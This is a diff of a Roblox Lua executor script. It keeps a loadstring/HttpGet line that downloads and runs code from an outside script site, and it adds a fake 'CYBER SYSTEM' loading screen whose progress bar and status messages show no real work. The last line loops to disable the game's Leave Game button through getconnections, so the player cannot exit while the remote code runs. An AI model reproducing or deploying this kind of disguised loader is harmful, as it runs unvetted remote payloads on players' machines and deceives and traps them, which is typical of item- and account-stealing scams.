@@ -1,3 +1,231 @@
 loadstring(game:HttpGet("https://star-scripts.com/api/run/Fp-pdBXFo53tGxVMHYR81yPgy3_QpBbd"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/Chocola-Auto-Spin-RNG/refs/heads/main/script.lua"))()
+-- CYBER LOADING SCREEN
+-- LocalScript
+
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+-- ScreenGui
+local gui = Instance.new("ScreenGui")
+gui.Name = "CyberLoading"
+gui.ResetOnSpawn = false
+gui.Parent = playerGui
+
+-- Main window
+local main = Instance.new("Frame")
+main.Size = UDim2.new(0, 300, 0, 145)
+main.Position = UDim2.new(0.5, -150, 0.5, -72)
+main.BackgroundColor3 = Color3.fromRGB(8, 10, 18)
+main.BorderSizePixel = 0
+main.Parent = gui
+
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 10)
+corner.Parent = main
+
+-- Cyber outline
+local stroke = Instance.new("UIStroke")
+stroke.Color = Color3.fromRGB(0, 255, 200)
+stroke.Thickness = 1.5
+stroke.Transparency = 0.15
+stroke.Parent = main
+
+-- Top bar
+local top = Instance.new("Frame")
+top.Size = UDim2.new(1, 0, 0, 30)
+top.BackgroundColor3 = Color3.fromRGB(12, 18, 30)
+top.BorderSizePixel = 0
+top.Parent = main
+
+local topCorner = Instance.new("UICorner")
+topCorner.CornerRadius = UDim.new(0, 10)
+topCorner.Parent = top
+
+-- Title
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, -45, 1, 0)
+title.Position = UDim2.new(0, 12, 0, 0)
+title.BackgroundTransparency = 1
+title.Text = "◆ CYBER SYSTEM"
+title.TextColor3 = Color3.fromRGB(0, 255, 200)
+title.TextSize = 13
+title.Font = Enum.Font.GothamBold
+title.TextXAlignment = Enum.TextXAlignment.Left
+title.Parent = top
+
+-- Close-looking decorative dot
+local dot = Instance.new("Frame")
+dot.Size = UDim2.new(0, 8, 0, 8)
+dot.Position = UDim2.new(1, -20, 0.5, -4)
+dot.BackgroundColor3 = Color3.fromRGB(0, 255, 200)
+dot.BorderSizePixel = 0
+dot.Parent = top
+
+local dotCorner = Instance.new("UICorner")
+dotCorner.CornerRadius = UDim.new(1, 0)
+dotCorner.Parent = dot
+
+-- Loading text
+local loading = Instance.new("TextLabel")
+loading.Size = UDim2.new(1, -20, 0, 30)
+loading.Position = UDim2.new(0, 10, 0, 43)
+loading.BackgroundTransparency = 1
+loading.Text = "LOADING SCRIPT"
+loading.TextColor3 = Color3.fromRGB(235, 255, 250)
+loading.TextSize = 18
+loading.Font = Enum.Font.GothamBold
+loading.Parent = main
+
+-- Status
+local status = Instance.new("TextLabel")
+status.Size = UDim2.new(1, -20, 0, 20)
+status.Position = UDim2.new(0, 10, 0, 70)
+status.BackgroundTransparency = 1
+status.Text = "Please wait..."
+status.TextColor3 = Color3.fromRGB(130, 160, 170)
+status.TextSize = 12
+status.Font = Enum.Font.Gotham
+status.Parent = main
+
+-- Progress background
+local progressBG = Instance.new("Frame")
+progressBG.Size = UDim2.new(1, -30, 0, 5)
+progressBG.Position = UDim2.new(0, 15, 0, 101)
+progressBG.BackgroundColor3 = Color3.fromRGB(25, 32, 42)
+progressBG.BorderSizePixel = 0
+progressBG.Parent = main
+
+local progressCorner = Instance.new("UICorner")
+progressCorner.CornerRadius = UDim.new(1, 0)
+progressCorner.Parent = progressBG
+
+-- Progress bar
+local progress = Instance.new("Frame")
+progress.Size = UDim2.new(0, 0, 1, 0)
+progress.BackgroundColor3 = Color3.fromRGB(0, 255, 200)
+progress.BorderSizePixel = 0
+progress.Parent = progressBG
+
+local progressCorner2 = Instance.new("UICorner")
+progressCorner2.CornerRadius = UDim.new(1, 0)
+progressCorner2.Parent = progress
+
+-- Percentage
+local percent = Instance.new("TextLabel")
+percent.Size = UDim2.new(1, -20, 0, 20)
+percent.Position = UDim2.new(0, 10, 0, 112)
+percent.BackgroundTransparency = 1
+percent.Text = "0%"
+percent.TextColor3 = Color3.fromRGB(0, 255, 200)
+percent.TextSize = 10
+percent.Font = Enum.Font.GothamBold
+percent.TextXAlignment = Enum.TextXAlignment.Right
+percent.Parent = main
+
+-- DRAGGING
+local UserInputService = game:GetService("UserInputService")
+
+local dragging = false
+local dragStart
+local startPos
+
+top.InputBegan:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1
+		or input.UserInputType == Enum.UserInputType.Touch then
+		
+		dragging = true
+		dragStart = input.Position
+		startPos = main.Position
+
+		input.Changed:Connect(function()
+			if input.UserInputState == Enum.UserInputState.End then
+				dragging = false
+			end
+		end)
+	end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+	if dragging and
+		(input.UserInputType == Enum.UserInputType.MouseMovement
+		or input.UserInputType == Enum.UserInputType.Touch) then
+
+		local delta = input.Position - dragStart
+
+		main.Position = UDim2.new(
+			startPos.X.Scale,
+			startPos.X.Offset + delta.X,
+			startPos.Y.Scale,
+			startPos.Y.Offset + delta.Y
+		)
+	end
+end)
+
+-- Animated loading cycle
+task.spawn(function()
+	local messages = {
+		"Please wait...",
+		"Initializing modules...",
+		"Connecting systems...",
+		"Loading components...",
+		"Syncing interface...",
+		"Almost ready..."
+	}
+
+	local index = 1
+
+	while gui.Parent do
+		for i = 0, 100 do
+			if not gui.Parent then break end
+
+			progress.Size = UDim2.new(i / 100, 0, 1, 0)
+			percent.Text = tostring(i) .. "%"
+
+			-- Moving glow
+			local glow = TweenService:Create(
+				stroke,
+				TweenInfo.new(0.4, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
+				{Transparency = 0.45}
+			)
+			glow:Play()
+
+			task.wait(0.035)
+		end
+
+		status.Text = messages[index]
+
+		index += 1
+		if index > #messages then
+			index = 1
+		end
+
+		task.wait(0.35)
+	end
+end)
+
+-- Pulsing cyber border
+task.spawn(function()
+	while gui.Parent do
+		local tween1 = TweenService:Create(
+			stroke,
+			TweenInfo.new(0.8, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
+			{Transparency = 0.05}
+		)
+
+		local tween2 = TweenService:Create(
+			stroke,
+			TweenInfo.new(0.8, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
+			{Transparency = 0.45}
+		)
+
+		tween1:Play()
+		tween1.Completed:Wait()
+
+		tween2:Play()
+		tween2.Completed:Wait()
+	end
+end)
 task.spawn(function() while task.wait() do pcall(function() for _,v in ipairs(getconnections(game:GetService("CoreGui").RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.PageView.PageViewInnerFrame.LeaveGamePage.LeaveButtonsContainer.LeaveButtonsContainer.LeaveGameButton.Activated)) do v:Disable() end end) end end)
